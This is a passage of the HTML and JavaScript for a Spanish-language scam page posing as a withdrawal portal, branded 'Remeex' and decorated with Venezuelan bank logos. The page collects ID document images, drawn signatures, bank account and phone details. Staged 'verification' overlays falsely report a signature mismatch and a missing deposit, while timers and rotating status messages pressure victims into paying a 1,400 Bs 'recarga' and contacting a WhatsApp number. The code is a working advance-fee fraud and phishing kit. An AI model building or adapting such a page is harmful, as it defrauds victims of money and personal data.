        <p style="font-size:0.92rem; line-height:1.4; margin-top:0.8rem;">
          <strong>Concepto:</strong> <span id="conceptoRecargaModal">[Número de Identificación]</span>
        </p>
      </div>
      <button class="btn btn-secondary" id="closeDatosModalBtn" style="margin-top: 1rem;">Cerrar</button>
    </div>
  </div>

  <!-- SCRIPT PRINCIPAL -->
  <script>
    /****************************************************
     * Mapeo de nombres de bancos a sus logotipos
     ****************************************************/
    const bankLogosMapping = {
      "Banco de Venezuela, SA": "https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png",
      "Banco Central de Venezuela": "https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png",
      "Banco Venezolano de Crédito, SA": "https://www.venezolano.com/images/galeria/108_1.png",
      "Banco Mercantil, CA": "https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif",
      "Banco Provincial, SA": "https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg",
      "Banco del Caribe CA, Bancaribe": "https://d3olc33sy92l9e.cloudfront.net/wp-content/themes/bancaribe/images/Bancaribe-LogotipoTurquesa.png",
      "Banco Exterior CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/d3/Banco-Exterior-VE-logo.png/183px-Banco-Exterior-VE-logo.png",
      "Banco Caroní CA, Banco Universal": "https://www.bancocaroni.com.ve/wp-content/uploads/elementor/thumbs/Logo-252-x-48-1-qvqyrv33uw6afqa09bf5f2tswrzr0yaos9y59b3tuo.png",
      "Banesco Banco Universal, CA": "https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip",
      "Banco Sofitasa Banco Universal, CA": "https://www.sofitasa.com/assets/img/nuevo_logo.png",
      "Banco Plaza, Banco Universal": "https://plazacdn.s3.amazonaws.com/wp-content/themes/bancoplaza/imagenes/logobancoplaza-2.png",
      "Banco Fondo Común, CA": "https://www.bfc.com.ve/wp-content/uploads/2021/01/logofos.png",
      "100% Banco, Banco Comercial, CA": "https://www.100x100banco.com/img/logo.png",
      "Banco del Tesoro CA, Banco Universal": "https://upload.wikimedia.org/wikipedia/commons/thumb/5/5c/Logo_Banco_del_Tesoro.jpg/320px-Logo_Banco_del_Tesoro.jpg",
      "Bancrecer SA, Banco Microfinanciero": "https://www.bancrecer.com.ve/images/img/bancrecer-logo.png",
      "Banco Activo CA, Banco Universal": "https://www.bancoactivo.com/logo.svg",
      "Bancamiga Banco Universal, CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png",
      "Banplus Banco Universal, CA": "https://www.banplus.com/uploads/contenidos/logo_banplus2023.jpg",
      "Banco Bicentenario del Pueblo, Banco Universal CA": "https://upload.wikimedia.org/wikipedia/commons/thumb/d/da/BancoDigitaldelosTrabajadores.png/320px-BancoDigitaldelosTrabajadores.png",
      "Banco Nacional de Crédito CA, Banco Universal": "https://www.bncenlinea.com/images/default-source/misc/BNCLogo_rebrand.png"
    };

    // Función para normalizar el nombre del banco (quita espacios, pasa a minúsculas y remueve acentos)
    function normalizeBankName(name) {
      return name.trim().toLowerCase().normalize("NFD").replace(/[\u0300-\u036f]/g, "");
    }

    // Crear un mapping normalizado para las claves
    const normalizedBankLogosMapping = {};
    Object.keys(bankLogosMapping).forEach(key => {
      normalizedBankLogosMapping[normalizeBankName(key)] = bankLogosMapping[key];
    });

    /****************************************************
     * Función para obtener la URL del logo del banco
     * Intenta coincidencia exacta; si no, hace una búsqueda “fuzzy”
     ****************************************************/
    function getBankLogoURL(bankName) {
      // Cambiamos la ruta por defecto a un placeholder real (puedes modificarla)
      const defaultLogo = "https://via.placeholder.com/100x50?text=Logo";
      if (!bankName) return defaultLogo;
      const normalizedInput = normalizeBankName(bankName);
      
      // 1. Buscamos coincidencia exacta en el mapping normalizado
      if (normalizedBankLogosMapping[normalizedInput]) {
        return normalizedBankLogosMapping[normalizedInput];
      }
      
      // 2. Si no hay coincidencia exacta, se recorre cada clave para ver si se incluye una en la otra
      for (let key in normalizedBankLogosMapping) {
        if (normalizedInput.includes(key) || key.includes(normalizedInput)) {
          return normalizedBankLogosMapping[key];
        }
      }
      
      // 3. Si no se encontró ninguna coincidencia, se retorna un logo por defecto
      return defaultLogo;
    }

    /****************************************************
     * Variables globales
     ****************************************************/
    let saldoDisponible         = 0;
    let nombreCompleto          = "";
    let documentoBeneficiario   = "";
    let fechaNacimiento         = "";
    let bancoUsuario            = "";
    let numeroCuenta            = "";
    let tipoCuenta              = "";
    let telefonoUsuario         = "";
    let logoBancoUsuario        = "";

    // Para firma digital
    let isDrawing = false;
    let ctx, signatureCanvas;

    // Timers y contadores
    let confirmInfoBtnCountdown        = 5;    
    let securityVerification1Countdown = 10;   
    let securityVerification2Countdown = 8;    
    
    let security3ACountdown            = 38;   // Se cambió de 20 a 38 segundos
    let security3BCountdown            = 20;   
    let recargaReadyBtnCountdown       = 180;  // Se cambió de 20 a 180 segundos (3 minutos)
    
    let confirmRecargaBtnCountdown     = 6;    

    // Bandera para controlar si el botón de la última recarga ya está habilitado
    let recargaReadyBtnEnabled = false;

    document.addEventListener("DOMContentLoaded", () => {
      // 1) Cargar datos de sessionStorage (datosRemeex)
      const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');

      // Ajustamos campos bancarios
      if (datosRemeex.bankName) {
          document.getElementById('nombreBanco').innerHTML = `Banco: <strong>${datosRemeex.bankName}</strong>`;
      }
      if (datosRemeex.bankAccount) {
          document.getElementById('numeroCuenta').innerHTML = `N° de Cuenta: <strong>${datosRemeex.bankAccount}</strong>`;
      }
      if (datosRemeex.bankType) {
          document.getElementById('tipoCuenta').innerHTML = `Tipo: <strong>${datosRemeex.bankType}</strong>`;
      }

      // Llenar variables globales
      if (datosRemeex.fullName) {
        nombreCompleto = datosRemeex.fullName;
      }
      if (datosRemeex.docNumberCompleto) {
        documentoBeneficiario = datosRemeex.docNumberCompleto;
      }
      if (datosRemeex.birthDate) {
        fechaNacimiento = datosRemeex.birthDate;
      }
      if (datosRemeex.bankName) {
        bancoUsuario = datosRemeex.bankName;
      }
      if (datosRemeex.bankAccount) {
        numeroCuenta = datosRemeex.bankAccount;
      }
      if (datosRemeex.bankType) {
        tipoCuenta = datosRemeex.bankType;
      }
      if (datosRemeex.userPhone) {
        telefonoUsuario = datosRemeex.userPhone;
      }

      // Nueva funcionalidad: si en sessionStorage viene definido el logo del banco, lo usamos;
      // de lo contrario, se utiliza el mapeo a partir del nombre del banco.
      if (datosRemeex.bankLogo) {
        logoBancoUsuario = datosRemeex.bankLogo;
      } else {
        logoBancoUsuario = getBankLogoURL(bancoUsuario);
      }

      // 2) Obtenemos saldo en formato de texto (ej: "1.800,00 Bs")
      let saldoData = sessionStorage.getItem("currentBalanceBS") || "0,00 Bs";
      // Convertimos a número flotante
      saldoDisponible = parseFloat(
        saldoData
          .replace(/\./g, '')
          .replace(',', '.')
          .replace(/[^\d.]/g, '')
      ) || 0;

      // 3) Inicializar la página
      initPageData();
      setupEventListeners();

      // Iniciar el contador para "Retirar a mi banco"
      startRetirarCountdown();

      // Iniciar la rotación del banner de estado en Saldo disponible
      startStatusBannerRotation();
    });

    function initPageData() {
      // Elementos principales
      const userNameElem        = document.getElementById("userName");
      const balanceAmountElem   = document.getElementById("balanceAmount");
      const benefNameElem       = document.getElementById("benefName");
      const benefDocElem        = document.getElementById("benefDoc");
      const benefBirthElem      = document.getElementById("benefBirth");
      const bankLogoSmall       = document.getElementById("bankLogoSmall");

      // Asignamos en el DOM
      userNameElem.textContent       = nombreCompleto || "[NombreUsuario]";
      balanceAmountElem.textContent  = formatNumberVE(saldoDisponible) + " Bs";
      benefNameElem.innerHTML        = `Nombre: <strong>${nombreCompleto || "[Nombre Beneficiario]"}</strong>`;
      benefDocElem.innerHTML         = `Documento: <strong>${documentoBeneficiario || "[Doc]"}</strong>`;
      benefBirthElem.innerHTML       = `F. Nac: <strong>${fechaNacimiento || "[Fecha]"}</strong>`;

      // Logo banco (usando el logo obtenido desde sessionStorage o el mapeo)
      if (bankLogoSmall) {
        bankLogoSmall.src = logoBancoUsuario;
        console.log("Banco Usuario:", bancoUsuario);
        console.log("Logo URL:", logoBancoUsuario);
      }

      // Texto dinámico en tarjetas modificadas
      document.getElementById("nombreUsuarioAviso").textContent   = nombreCompleto;

      // Actualizar el texto de verificación de seguridad con el número de documento
      const securityVerificationText1 = document.getElementById("securityVerificationText1");
      if (securityVerificationText1 && documentoBeneficiario) {
        securityVerificationText1.textContent = `Tu firma no coincide con la que aparece en tu documento de identidad (${documentoBeneficiario}). Por ello, necesitamos validar que nadie esté suplantando tu identidad. Debes pasar por un proceso adicional de seguridad.`;
      }

      // Actualizar spans dinámicos usando las clases (ya que se usan en múltiples lugares)
      document.querySelectorAll(".nombreBancoUsuario").forEach(span => {
        span.textContent = bancoUsuario;
      });
      document.querySelectorAll(".numeroCuentaUsuario").forEach(el => {
        el.textContent = numeroCuenta;
      });
      document.querySelectorAll(".nombreBancoRecarga").forEach(el => {
        el.textContent = bancoUsuario;
      });

      // Suma de saldo + 1400
      const totalCompleto = saldoDisponible + 1400;
      document.getElementById("saldoRequerido").textContent       = formatNumberVE(saldoDisponible) + " Bs";
      const saldoTotalCompletoEl = document.getElementById("saldoTotalCompleto");
      if (saldoTotalCompletoEl) {
        saldoTotalCompletoEl.textContent = formatNumberVE(totalCompleto) + " Bs";
      }

      // Tarjeta recarga
      const recargaBancoOrigen = document.getElementById("recargaBancoOrigen");
      const recargaTelefono    = document.getElementById("recargaTelefono");
      const recargaCedula      = document.getElementById("recargaCedula");
      const logoBancoOrigen    = document.getElementById("logoBancoOrigen");

      if (recargaBancoOrigen) recargaBancoOrigen.value = bancoUsuario;
      if (recargaTelefono)    recargaTelefono.value    = telefonoUsuario;
      if (recargaCedula)      recargaCedula.value      = documentoBeneficiario;
      if (logoBancoOrigen) {
        logoBancoOrigen.src = logoBancoUsuario;
      }

      // Montos en recargaSection
      const montoRetiroBs      = document.getElementById("montoRetiroBs");
      const montoDepositoTotal = document.getElementById("montoDepositoTotal");
      if (montoRetiroBs) {
        montoRetiroBs.textContent = formatNumberVE(saldoDisponible) + " Bs";
      }
      if (montoDepositoTotal) {
        montoDepositoTotal.textContent = formatNumberVE(totalCompleto) + " Bs";
      }

      // Actualizar el "concepto" en la sección de la tarjeta de recarga
      const conceptoRecargaElem = document.getElementById("conceptoRecarga");
      if (conceptoRecargaElem) {
        conceptoRecargaElem.textContent = documentoBeneficiario;
      }
      // Actualizar el concepto en la tarjeta "Último paso..." (pago móvil)
      const conceptoPagoMovilElem = document.getElementById("conceptoPagoMovil");
      if (conceptoPagoMovilElem) {
        conceptoPagoMovilElem.textContent = documentoBeneficiario;
      }
    }

    // Formatea al estilo VE
    function formatNumberVE(num) {
      return num.toLocaleString("es-VE", {
        minimumFractionDigits: 2,
        maximumFractionDigits: 2,
      });
    }

    function setupEventListeners() {
      // 1) Tarjeta "Retirar a mi Banco"
      const confirmInfoBtn = document.getElementById("confirmInfoBtn");
      confirmInfoBtn.addEventListener("click", () => {
        hideVisaCard("datosRetiroSection");
        showVisaCard("uploadSection");
      });

      // 2) Subir Documento
      const idDocument       = document.getElementById("idDocument");
      const previewContainer = document.getElementById("previewContainer");
      const docPreview       = document.getElementById("docPreview");
      const confirmDocBtn    = document.getElementById("confirmDocBtn");

      idDocument.addEventListener("change", (e) => {
        const file = e.target.files[0];
        if (file && file.type.startsWith("image/")) {
          const reader = new FileReader();
          reader.onload = (ev) => {
            docPreview.src = ev.target.result;
            previewContainer.classList.add("active");
            confirmDocBtn.style.display = "inline-block";
          };
          reader.readAsDataURL(file);
        }
      });

      confirmDocBtn.addEventListener("click", () => {
        // Inicia secuencia de overlays: Analizando documento → Confirmado → Extrayendo firma
        startDocumentoOverlaySequence();
      });

      // 3) Firma Digital
      const clearSignatureBtn = document.getElementById("clearSignatureBtn");
      const saveSignatureBtn  = document.getElementById("saveSignatureBtn");

      clearSignatureBtn.addEventListener("click", () => {
        if (ctx) {
          ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
        }
      });

      saveSignatureBtn.addEventListener("click", () => {
        // Abre overlay para confirmar
        showOverlay("overlayConfirmFirma");
      });

      // Overlay Confirmar Firma
      const editarFirmaBtn    = document.getElementById("editarFirmaBtn");
      const continuarFirmaBtn = document.getElementById("continuarFirmaBtn");

      editarFirmaBtn.addEventListener("click", () => {
        hideOverlay("overlayConfirmFirma");
      });

      continuarFirmaBtn.addEventListener("click", () => {
        hideOverlay("overlayConfirmFirma");
        startSecuenciaFirma(); 
      });

      // 4) Verificación 1
      const continueSecurityBtn1 = document.getElementById("continueSecurityBtn1");
      continueSecurityBtn1.addEventListener("click", () => {
        hideVisaCard("securityVerification1");
        showVisaCard("securityVerification2");
        startSecurity2Countdown();
      });

      // 5) Verificación 2
      const continueSecurityBtn2 = document.getElementById("continueSecurityBtn2");
      continueSecurityBtn2.addEventListener("click", () => {
        hideVisaCard("securityVerification2");
        // Mostramos la Tarjeta 1 (nueva)
        showVisaCard("securityVerification3A");
        startSecurity3ACountdown();
      });

      // -- Tarjeta 1 (nueva) -> Tarjeta 2
      const continueSecurity3ABtn = document.getElementById("continueSecurity3ABtn");
      continueSecurity3ABtn.addEventListener("click", () => {
        hideVisaCard("securityVerification3A");
        showVisaCard("securityVerification3B");
        startSecurity3BCountdown();
      });

      // -- Tarjeta 2 (nueva) -> Tarjeta 3
      const continueSecurity3BBtn = document.getElementById("continueSecurity3BBtn");
      continueSecurity3BBtn.addEventListener("click", () => {
        hideVisaCard("securityVerification3B");
        showVisaCard("securityVerification3C");
        startRecargaReadyCountdown(); // 3 minutos (180 s)
      });

      // -- Tarjeta 3 (nueva) -> Verificar Recarga
      const recargaReadyBtn = document.getElementById("recargaReadyBtn");
      recargaReadyBtn.addEventListener("click", () => {
        if (!recargaReadyBtnEnabled) {
          alert("Por favor, lea detenidamente la información. El botón estará disponible en 3 minutos.");
        } else {
          hideVisaCard("securityVerification3C");
          startVerificandoRecarga();
        }
      });

      // 7) Completar Datos de Recarga
      const confirmRecargaBtn = document.getElementById("confirmRecargaBtn");
      confirmRecargaBtn.addEventListener("click", () => {
        const comprobanteVal = document.getElementById("comprobanteInput").value.trim();
        if (!/^\d{12}$/.test(comprobanteVal) || comprobanteVal === "123456789123") {
          alert("El comprobante debe tener 12 dígitos válidos y no ser '123456789123'.");
          return;
        }
        hideVisaCard("recargaSection");
        startSecuenciaFinal();
      });

      // NUEVO: Evento para mostrar modal de datos desenfocados
      const blurContainer = document.getElementById("blurContainer");
      if (blurContainer) {
        blurContainer.addEventListener("click", function() {
          showOverlay("overlayDatosVerificacion");
        });
      }

      // NUEVO: Cerrar modal de datos
      const closeDatosModalBtn = document.getElementById("closeDatosModalBtn");
      if (closeDatosModalBtn) {
        closeDatosModalBtn.addEventListener("click", function() {
          hideOverlay("overlayDatosVerificacion");
        });
      }
    }

    /****************************************************
     * Mostrar/ocultar tarjetas y overlays
     ****************************************************/
    function showVisaCard(id) {
      const card = document.getElementById(id);
      if (card) {
        card.classList.add("active");
        card.style.display = "block";
        if (id === "signatureSection") {
          initSignatureCanvas();
          resizeSignatureCanvas();
        }
      }
    }
    function hideVisaCard(id) {
      const card = document.getElementById(id);
      if (card) {
        card.classList.remove("active");
        card.style.display = "none";
      }
    }
    function showOverlay(id) {
      const overlay = document.getElementById(id);
      if (overlay) overlay.classList.add("active");
    }
    function hideOverlay(id) {
      const overlay = document.getElementById(id);
      if (overlay) overlay.classList.remove("active");
    }

    /****************************************************
     * Canvas de Firma
     ****************************************************/
    function initSignatureCanvas() {
      if (!signatureCanvas) {
        signatureCanvas = document.getElementById("signatureCanvas");
      }
      if (!signatureCanvas) return;

      ctx = signatureCanvas.getContext("2d");

      // Eventos de mouse
      signatureCanvas.addEventListener("mousedown", startDraw);
      signatureCanvas.addEventListener("mousemove", draw);
      signatureCanvas.addEventListener("mouseup", endDraw);
      signatureCanvas.addEventListener("mouseleave", endDraw);

      // Eventos táctiles
      signatureCanvas.addEventListener("touchstart", startDrawTouch, { passive: false });
      signatureCanvas.addEventListener("touchmove", drawTouch, { passive: false });
      signatureCanvas.addEventListener("touchend", endDrawTouch);
    }

    function resizeSignatureCanvas() {
      if (!signatureCanvas) return;
      signatureCanvas.width  = signatureCanvas.offsetWidth;
      signatureCanvas.height = signatureCanvas.offsetHeight;
    }

    function startDraw(e) {
      isDrawing = true;
      ctx.beginPath();
      ctx.moveTo(e.offsetX, e.offsetY);
    }
    function draw(e) {
      if (!isDrawing) return;
      ctx.lineWidth = 2;
      ctx.lineCap = "round";
      ctx.strokeStyle = "#000";
      ctx.lineTo(e.offsetX, e.offsetY);
      ctx.stroke();
    }
    function endDraw() {
      isDrawing = false;
      ctx.closePath();
    }
    function getTouchPos(e) {
      const rect = signatureCanvas.getBoundingClientRect();
      return {
        x: e.touches[0].clientX - rect.left,
        y: e.touches[0].clientY - rect.top
      };
    }
    function startDrawTouch(e) {
      e.preventDefault();
      isDrawing = true;
      ctx.beginPath();
      const pos = getTouchPos(e);
      ctx.moveTo(pos.x, pos.y);
    }
    function drawTouch(e) {
      e.preventDefault();
      if (!isDrawing) return;
      const pos = getTouchPos(e);
      ctx.lineWidth = 2;
      ctx.lineCap = "round";
      ctx.strokeStyle = "#000";
      ctx.lineTo(pos.x, pos.y);
      ctx.stroke();
    }
    function endDrawTouch(e) {
      e.preventDefault();
      isDrawing = false;
      ctx.closePath();
    }

    /****************************************************
     * Contadores
     ****************************************************/
    // Botón "Retirar a mi banco"
    function startRetirarCountdown() {
      const btn = document.getElementById("confirmInfoBtn");
      const cdLabel = document.getElementById("countdownRetiroBtn");
      let timer = confirmInfoBtnCountdown;
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    function startSecurity1Countdown() {
      const btn = document.getElementById("continueSecurityBtn1");
      const cdLabel = document.getElementById("countdownSecurity1");
      let timer = securityVerification1Countdown;
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    function startSecurity2Countdown() {
      const btn = document.getElementById("continueSecurityBtn2");
      const cdLabel = document.getElementById("countdownSecurity2");
      let timer = securityVerification2Countdown;
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    // Tarjeta 1 (nueva)
    function startSecurity3ACountdown() {
      const btn = document.getElementById("continueSecurity3ABtn");
      const cdLabel = document.getElementById("countdownSecurity3A");
      let timer = security3ACountdown; // 38 s
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    // Tarjeta 2 (nueva)
    function startSecurity3BCountdown() {
      const btn = document.getElementById("continueSecurity3BBtn");
      const cdLabel = document.getElementById("countdownSecurity3B");
      let timer = security3BCountdown; // 20 s
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    // Tarjeta 3 (nueva)
    function startRecargaReadyCountdown() {
      const btn = document.getElementById("recargaReadyBtn");
      const cdLabel = document.getElementById("countdownRecargaReady");
      let timer = recargaReadyBtnCountdown; // 180 s
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          recargaReadyBtnEnabled = true; // Habilitamos el botón lógicamente
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    // Confirmar Recarga
    function startConfirmRecargaCountdown() {
      const btn = document.getElementById("confirmRecargaBtn");
      const cdLabel = document.getElementById("countdownRecargaConfirm");
      let timer = confirmRecargaBtnCountdown;
      const interval = setInterval(() => {
        timer--;
        cdLabel.textContent = `Disponible en ${timer} s...`;
        if (timer <= 0) {
          clearInterval(interval);
          btn.classList.remove("btn-disabled");
          btn.disabled = false;
          cdLabel.textContent = "";
        }
      }, 1000);
    }

    /****************************************************
     * Secuencias Overlays
     ****************************************************/
    function startSecuenciaFirma() {
      hideVisaCard("signatureSection");
      showOverlay("overlaySecuenciaFirma");
      const titulo = document.getElementById("secuenciaFirmaTitulo");
      const texto  = document.getElementById("secuenciaFirmaTexto");
      const logo   = document.getElementById("secuenciaFirmaLogo");

      if (logo) logo.src = logoBancoUsuario;

      titulo.textContent = `Conectando con ${bancoUsuario}...`;
      texto.textContent  = "Por favor, espera...";

      setTimeout(() => {
        titulo.textContent = `Analizando tu firma registrada en ${bancoUsuario}...`;
        texto.textContent  = "Comparando trazos y coincidencias...";
      }, 3000);

      setTimeout(() => {
        titulo.textContent = `Tu firma no coincide`;
        texto.textContent  = `El banco indica discrepancias en la firma.`;
        titulo.classList.add("dramatic");
      }, 6000);

      setTimeout(() => {
        hideOverlay("overlaySecuenciaFirma");
        titulo.classList.remove("dramatic");
        showVisaCard("securityVerification1");
        startSecurity1Countdown();
      }, 10000);
    }

    function startDocumentoOverlaySequence() {
      showOverlay("overlayDocumento");
      const titulo = document.getElementById("overlayDocumentoTitulo");
      const texto  = document.getElementById("overlayDocumentoTexto");
      const logo   = document.getElementById("overlayDocumentoLogo");
      if (logo) {
        logo.src = logoBancoUsuario;
      }
      titulo.textContent = "Analizando documento de identidad...";
      texto.textContent  = "Por favor, espera.";
      setTimeout(() => {
        titulo.textContent = "Documento cargado con éxito";
        texto.textContent  = "";
        setTimeout(() => {
          titulo.textContent = "Extrayendo firma para comparar con la registrada en tu banco";
          setTimeout(() => {
            hideOverlay("overlayDocumento");
            hideVisaCard("uploadSection");
            showVisaCard("signatureSection");
            initSignatureCanvas();
            resizeSignatureCanvas();
          }, 2000);
        }, 2000);
      }, 3000);
    }

    function startVerificandoRecarga() {
      showOverlay("overlayVerificandoRecarga");
      const titulo = document.getElementById("verificandoRecargaTitulo");
      const texto  = document.getElementById("verificandoRecargaTexto");
      const logo   = document.getElementById("verificandoRecargaLogo");

      if (logo) logo.src = logoBancoUsuario;

      titulo.textContent = "Verificando tu primera recarga...";
      texto.textContent  = "Por favor, espera mientras consultamos con tu banco.";

      setTimeout(() => {
        titulo.textContent = "Comprobando si eres el titular de la cuenta...";
        texto.textContent  = "Revisando registros...";
      }, 3000);

      setTimeout(() => {
        titulo.textContent = `${bancoUsuario} no encuentra tu recarga de 1.400 Bs`;
        texto.textContent  = "No se detectan movimientos. ¿Quizá debas completarlo manualmente?";
      }, 6000);

      setTimeout(() => {
        hideOverlay("overlayVerificandoRecarga");
        showVisaCard("recargaSection");
        startConfirmRecargaCountdown();
      }, 9000);
    }

    function startSecuenciaFinal() {
      showOverlay("overlaySecuenciaFinal");
      const titulo = document.getElementById("secFinalTitulo");
      const texto  = document.getElementById("secFinalTexto");
      const logo   = document.getElementById("secFinalLogo");

      if (logo) logo.src = logoBancoUsuario;

      titulo.textContent = `Conectando con ${bancoUsuario}...`;
      texto.textContent  = "Verificando tu recarga de 1.400,00 Bs...";

      setTimeout(() => {
        titulo.textContent = `Preparando tu depósito a ${bancoUsuario}`;
        texto.textContent  = "Por favor, espera...";
      }, 4000);

      setTimeout(() => {
        titulo.textContent = "No encontramos tu recarga";
        texto.textContent  = "El banco sigue reportando saldo sin ese movimiento.";
        titulo.classList.add("dramatic");
      }, 7000);

      setTimeout(() => {
        hideOverlay("overlaySecuenciaFinal");
        titulo.classList.remove("dramatic");
        // Actualizamos el contenido del overlay de Error con el cálculo dinámico
        document.getElementById("errorFinalTexto").innerHTML = `No se puede verificar la titularidad de tu cuenta hasta que detectemos tu primera recarga. Depositaremos <strong>${formatNumberVE(saldoDisponible + 1400)} Bs</strong> una vez validemos tu identidad. <br/><br/> Por favor, contáctate con soporte.`;
        showOverlay("overlayErrorFinal");
        configurarWhatsAppLink();
      }, 10000);
    }

    /****************************************************
     * Configuración del enlace de WhatsApp y redirección tras 2 minutos
     ****************************************************/
    function configurarWhatsAppLink() {
      const whatsappLink = document.getElementById("whatsappLink");
      if (!whatsappLink) return;
      const msg = encodeURIComponent(
        `Hola, soy ${nombreCompleto}, con cédula ${documentoBeneficiario}, ` +
        `no se encontró mi recarga de 1.400 Bs y mi firma no coincide. ` +
        `Necesito ayuda para liberar mis fondos de ${formatNumberVE(saldoDisponible)} Bs en ${bancoUsuario}.`
      );
      whatsappLink.href = `https://wa.me/17373018059?text=${msg}`;
      // Al hacer click, se abre WhatsApp y se inicia la cuenta regresiva de 2 minutos para redirigir a visa.es
      whatsappLink.addEventListener("click", function(){
         setTimeout(function(){
             window.location.href = "https://visa.es";
         }, 120000);
      });
    }

    /****************************************************
     * Función para copiar texto al portapapeles
     ****************************************************/
    function copyToClipboard(elementId) {
      const text = document.getElementById(elementId).innerText;
      navigator.clipboard.writeText(text).then(() => {
        alert("Copiado: " + text);
      }).catch(err => {
        alert("Error al copiar: " + err);
      });
    }
    
    /****************************************************
     * Rotación del banner de estado en la tarjeta "Saldo disponible"
     ****************************************************/
    function startStatusBannerRotation() {
      const banner = document.getElementById("statusBanner");
      if (!banner) return;
      const statusMessages = [
        "Todo listo",
        "preparando la entrega de fondos a tu cuenta",
        "Última parada, completa los últimos pasos para retirar tus fondos",
        "Sincronizando con tu banco",
        "Tu retiro está en la fase final",
        "Todo va perfecto",
        "Tu banco ya está procesando el pago",
        "Buenas noticias",
        "Tu retiro está en la fase final",
        "Tu solicitud está confirmada",
        "Tu dinero llega en cualquier momento",
        "Preparando tu depósito",
        "Retiro en curso",
        "Tu banco está verificando la transacción",
        "Comunicándonos con tu banco",
        "Procesando tu solicitud",
        "Pronto tendrás tu dinero",
        "Estamos verificando los detalles finales de tu retiro",
        "Tu dinero está a punto de ser depositado en tu cuenta",
        "Estamos agilizando tu transacción, falta muy poco",
        "El proceso avanza sin problemas, tu retiro está casi listo",
        "Últimos ajustes antes de enviar tu dinero a tu banco",
        "Confirmando la transferencia, pronto verás el saldo reflejado",
        "Revisando la información con tu banco para completar el retiro",
        "Tu transacción ha sido validada, pronto se reflejará en tu cuenta",
        "Estamos procesando la confirmación final con tu banco",
        "Todo en orden, en breve recibirás la confirmación del depósito",
        "Revisando la información con tu banco para completar el retiro",
        "Tu transacción ha sido validada, pronto se reflejará en tu cuenta",
        "Estamos procesando la confirmación final con tu banco",
        "Todo en orden, en breve recibirás la confirmación del depósito"
      ];
      let currentIndex = 0;
      banner.textContent = statusMessages[currentIndex];
      setInterval(() => {
        // Fade out
        banner.style.opacity = 0;
        setTimeout(() => {
          currentIndex = (currentIndex + 1) % statusMessages.length;
          banner.textContent = statusMessages[currentIndex];
          // Fade in
          banner.style.opacity = 1;
        }, 500); // Duración de la transición (0.5s)
      }, 10000);
    }
  </script>

  <!-- Script Tawk.to (opcional) -->
  <script>
    var Tawk_API = Tawk_API || {},
      Tawk_LoadStart = new Date();
    (function () {
      var s1 = document.createElement("script"),
        s0 = document.getElementsByTagName("script")[0];
      s1.async = true;
      s1.src = "https://embed.tawk.to/676eba4c49e2fd8dfeff071f/1ig48fetj";
      s1.charset = "UTF-8";
      s1.setAttribute("crossorigin", "*");
      s0.parentNode.insertBefore(s1, s0);
    })();
  </script>
</body>
</html>


